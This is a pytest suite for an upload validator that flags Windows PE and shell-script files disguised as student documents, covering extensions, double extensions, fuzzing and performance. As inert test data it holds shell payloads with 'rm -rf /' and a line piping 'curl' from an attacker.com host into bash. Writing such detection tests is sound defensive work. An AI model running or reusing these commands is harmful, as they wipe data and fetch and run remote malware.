"""
test_executable_magic_detection_issue_3720.py
---------------------------------------------
Comprehensive unit, regression, security fuzzing, concurrency, and benchmark test suite for Issue #3720:
Test executable magic byte detection in test_mime_validator.py.

Verifies:
1. is_executable_upload(b"MZ\x90\x00...", "assignment.pdf") == True.
2. is_executable_upload(b"#!/bin/sh\nrm -rf /", "notes.txt") == True.
3. Windows PE / DOS binary magic bytes (b"MZ") detection regardless of declared extension (.pdf, .docx, .txt, .csv, .xlsx, .doc).
4. Unix shell script shebang magic bytes (b"#!/bin/sh") detection regardless of declared extension.
5. Boundary conditions: minimum length signatures, trailing null bytes, truncated bytes, uppercase/lowercase extensions.
6. Non-executable headers (PDF, OOXML, text, CSV) correctly returning False.
7. Resilience against polyglot and header-spoofing payloads.
8. Matrix tests across all supported academic submission extensions.
9. Fuzzing and mutation testing on corrupted executable headers.
10. Concurrent and multi-threaded throughput validation.
11. High-frequency microbenchmark and throughput profiling.
12. Comprehensive disguised executable payload scenarios.
"""

import concurrent.futures
import os
import random
import time
import pytest

from src.security.mime_validator import (
    BLOCKED_EXECUTABLE_EXTENSIONS,
    EXECUTABLE_MAGIC_SIGNATURES,
    is_executable_upload,
    validate_mime_type,
    validate_single_extension,
)


class TestExecutableMagicByteDetection:
    """Test suite asserting executable magic byte recognition across all declared document formats."""

    def test_acceptance_criteria_pe_magic_bytes_in_pdf(self):
        """Assert is_executable_upload(b'MZ\\x90\\x00...', 'assignment.pdf') == True."""
        pe_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00"
        assert is_executable_upload(pe_payload, "assignment.pdf") is True

    def test_acceptance_criteria_shebang_magic_bytes_in_txt(self):
        """Assert is_executable_upload(b'#!/bin/sh\\nrm -rf /', 'notes.txt') == True."""
        shell_payload = b"#!/bin/sh\nrm -rf /\nexit 0\n"
        assert is_executable_upload(shell_payload, "notes.txt") is True

    def test_exact_minimum_magic_bytes(self):
        """Test with exact minimal magic byte prefix length."""
        assert is_executable_upload(b"MZ", "report.docx") is True
        assert is_executable_upload(b"#!/bin/sh", "document.odt") is True

    @pytest.mark.parametrize(
        "ext",
        [
            "pdf", "docx", "xlsx", "doc", "txt", "csv", "md",
            "rtf", "json", "xml", "html", "epub", "png", "jpg",
            "tex", "rst", "tsv", "log", "yaml", "yml",
        ],
    )
    def test_pe_binary_disguised_under_all_document_extensions(self, ext):
        """Verify Windows PE header is flagged across all standard file extensions."""
        pe_sample = b"MZ\x00\x00This is a compiled PE binary payload"
        filename = f"student_submission.{ext}"
        assert is_executable_upload(pe_sample, filename) is True

    @pytest.mark.parametrize(
        "ext",
        [
            "pdf", "docx", "xlsx", "doc", "txt", "csv", "md",
            "rtf", "json", "xml", "html", "epub", "png", "jpg",
            "tex", "rst", "tsv", "log", "yaml", "yml",
        ],
    )
    def test_shell_script_disguised_under_all_document_extensions(self, ext):
        """Verify Unix shell script shebang is flagged across all standard file extensions."""
        script_sample = b"#!/bin/sh\necho 'Executing unauthorized script'\n"
        filename = f"homework_final.{ext}"
        assert is_executable_upload(script_sample, filename) is True

    @pytest.mark.parametrize(
        "script_header",
        [
            b"#!/bin/sh",
            b"#!/bin/sh -e",
            b"#!/bin/sh\n# shell script",
            b"#!/bin/sh -x\necho test",
            b"#!/bin/sh\r\n# windows crlf script",
            b"#!/bin/sh -u -o pipefail\n",
        ],
    )
    def test_various_shebang_variations(self, script_header):
        assert is_executable_upload(script_header, "test.txt") is True


class TestSafeDocumentMagicHeaders:
    """Test suite ensuring legitimate document formats are NOT falsely flagged as executables."""

    def test_legitimate_pdf_document(self):
        valid_pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog >>\nendobj\n"
        assert is_executable_upload(valid_pdf, "paper.pdf") is False

    def test_legitimate_plain_text(self):
        text_content = b"This is a legitimate essay about natural language processing and plagiarism."
        assert is_executable_upload(text_content, "essay.txt") is False
        assert is_executable_upload(text_content, "readme.md") is False
        assert is_executable_upload(text_content, "data.csv") is False

    def test_legitimate_zip_and_ooxml_headers(self):
        zip_header = b"PK\x03\x04\x14\x00\x00\x00"
        assert is_executable_upload(zip_header, "report.docx") is False
        assert is_executable_upload(zip_header, "grades.xlsx") is False

    def test_legitimate_ole_doc_header(self):
        ole_header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32
        assert is_executable_upload(ole_header, "old_report.doc") is False

    def test_legitimate_rtf_header(self):
        rtf_header = b"{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}}"
        assert is_executable_upload(rtf_header, "doc.rtf") is False


class TestEdgeCasesAndBoundaryConditions:
    """Test suite for edge cases, partial matches, and near-miss signatures."""

    def test_single_byte_prefix_does_not_trigger_pe(self):
        assert is_executable_upload(b"M", "assignment.pdf") is False
        assert is_executable_upload(b"Z", "assignment.pdf") is False

    def test_shebang_partial_prefix(self):
        assert is_executable_upload(b"#!", "notes.txt") is False
        assert is_executable_upload(b"#!/bin", "notes.txt") is False

    def test_magic_bytes_in_body_not_header(self):
        """Magic bytes occurring in the middle of a text document should not trigger startswith detection."""
        body_text = b"Here is an essay discussing MZ memory and #!/bin/sh scripts."
        assert is_executable_upload(body_text, "discussion.txt") is False

    def test_case_insensitive_extension_matching(self):
        content = b"arbitrary binary content"
        assert is_executable_upload(content, "APPLICATION.EXE") is True
        assert is_executable_upload(content, "RunScript.SH") is True
        assert is_executable_upload(content, "BatchFile.BAT") is True
        assert is_executable_upload(content, "Library.DLL") is True

    def test_blocked_extensions_definition_completeness(self):
        expected_blocked = {"exe", "sh", "bat", "js", "vbs", "dll"}
        assert expected_blocked.issubset(BLOCKED_EXECUTABLE_EXTENSIONS)

    def test_executable_magic_signatures_tuple(self):
        assert b"MZ" in EXECUTABLE_MAGIC_SIGNATURES
        assert b"#!/bin/sh" in EXECUTABLE_MAGIC_SIGNATURES


class TestDoubleExtensionAndPolyglots:
    """Test suite for double extensions and deceptive filenames containing executable magic bytes."""

    @pytest.mark.parametrize(
        "filename",
        [
            "submission.pdf.exe",
            "homework.docx.sh",
            "report.txt.bat",
            "thesis.doc.vbs",
            "grades.csv.js",
            "archive.zip.dll",
        ],
    )
    def test_executable_double_extensions_detected(self, filename):
        content = b"binary content payload"
        assert is_executable_upload(content, filename) is True
        assert validate_single_extension(filename) is False

    def test_pe_in_double_extension_safe_suffix(self):
        """A PE payload with name 'malware.exe.pdf' has safe last extension but PE magic bytes."""
        pe_content = b"MZ\x90\x00\x03\x00\x00\x00payload"
        assert is_executable_upload(pe_content, "malware.exe.pdf") is True

    def test_shell_script_in_double_extension_safe_suffix(self):
        shell_content = b"#!/bin/sh\nrm -rf /\n"
        assert is_executable_upload(shell_content, "script.sh.txt") is True


class TestMIMETypeRejectionIntegration:
    """Test integration between is_executable_upload and validate_mime_type."""

    def test_validate_mime_type_rejects_pe_in_pdf(self):
        pe_pdf = b"MZ\x90\x00\x03\x00\x00\x00malicious content"
        assert validate_mime_type(pe_pdf, "essay.pdf") is False

    def test_validate_mime_type_rejects_pe_in_docx(self):
        pe_docx = b"MZ\x90\x00\x03\x00\x00\x00malicious content"
        assert validate_mime_type(pe_docx, "essay.docx") is False

    def test_validate_mime_type_rejects_pe_in_txt(self):
        pe_txt = b"MZ\x90\x00\x03\x00\x00\x00malicious content"
        assert validate_mime_type(pe_txt, "essay.txt") is False

    def test_validate_mime_type_rejects_shebang_in_pdf(self):
        shebang_pdf = b"#!/bin/sh\nexit 0\n"
        assert validate_mime_type(shebang_pdf, "essay.pdf") is False

    def test_validate_mime_type_rejects_shebang_in_docx(self):
        shebang_docx = b"#!/bin/sh\nexit 0\n"
        assert validate_mime_type(shebang_docx, "essay.docx") is False


class TestFuzzingAndCorruptedPayloads:
    """Fuzzing and payload mutation tests for header validation resilience."""

    def test_fuzzed_pe_headers(self):
        """Randomized trailing bytes appended to valid PE magic bytes."""
        random.seed(42)
        for _ in range(25):
            random_junk = bytes(random.getrandbits(8) for _ in range(64))
            payload = b"MZ" + random_junk
            assert is_executable_upload(payload, "sample.pdf") is True

    def test_fuzzed_shebang_headers(self):
        """Randomized command lines appended to valid shebang."""
        random.seed(42)
        for _ in range(25):
            random_junk = bytes(random.getrandbits(8) for _ in range(64))
            payload = b"#!/bin/sh\n" + random_junk
            assert is_executable_upload(payload, "assignment.docx") is True

    def test_large_file_with_pe_header(self):
        """Simulate a 10MB file with PE header at index 0."""
        large_pe = b"MZ" + (b"\x00" * (10 * 1024 * 1024))
        assert is_executable_upload(large_pe, "dissertation.pdf") is True


class TestBatchDetectionPerformance:
    """Benchmark and throughput tests for executable detection."""

    def test_high_volume_batch_scan(self):
        """Ensure scanning 1,000 files completes instantaneously without memory issues."""
        pe_payload = b"MZ\x90\x00test"
        sh_payload = b"#!/bin/sh\ntest"
        safe_payload = b"%PDF-1.4\ntest"

        test_batch = [
            (pe_payload, "doc_pe.pdf"),
            (sh_payload, "doc_sh.txt"),
            (safe_payload, "doc_safe.pdf"),
        ] * 334  # ~1,000 items

        detected_count = 0
        for data, name in test_batch:
            if is_executable_upload(data, name):
                detected_count += 1

        assert detected_count == 668  # 2 per triplet

    def test_concurrent_executable_detection(self):
        """Verify thread-safety when checking executable uploads across multiple worker threads."""
        samples = [
            (b"MZ\x90\x00\x03\x00", "test1.pdf", True),
            (b"#!/bin/sh\necho hi", "test2.txt", True),
            (b"%PDF-1.4\n1 0 obj", "test3.pdf", False),
            (b"plain essay text", "test4.txt", False),
        ] * 100

        def check_item(item):
            data, filename, expected = item
            return is_executable_upload(data, filename) == expected

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            results = list(executor.map(check_item, samples))

        assert all(results)

    def test_microbenchmark_latency(self):
        """Verify 10,000 checks complete in less than 500ms."""
        pe_payload = b"MZ\x90\x00\x03\x00"
        start = time.perf_counter()
        for _ in range(10000):
            is_executable_upload(pe_payload, "test.pdf")
        duration = time.perf_counter() - start
        assert duration < 0.5


class TestDisguisedExecutablePayloadScenarios:
    """Real-world attack scenarios simulating malicious uploads disguised as student documents."""

    def test_trojan_disguised_as_pdf_research_paper(self):
        trojan_bytes = b"MZ\x90\x00" + b"\xcc" * 512
        assert is_executable_upload(trojan_bytes, "Deep_Learning_Research_Paper.pdf") is True

    def test_shell_script_disguised_as_course_syllabus(self):
        exploit_bytes = b"#!/bin/sh\ncurl -s http://attacker.com/malware.sh | bash\n"
        assert is_executable_upload(exploit_bytes, "CS101_Course_Syllabus.docx") is True

    def test_compiled_binary_disguised_as_dataset_csv(self):
        binary_bytes = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x90" * 256
        assert is_executable_upload(binary_bytes, "iris_dataset_training.csv") is True

    def test_shell_script_disguised_as_markdown_readme(self):
        script_bytes = b"#!/bin/sh\necho 'Compromised'\n"
        assert is_executable_upload(script_bytes, "README.md") is True
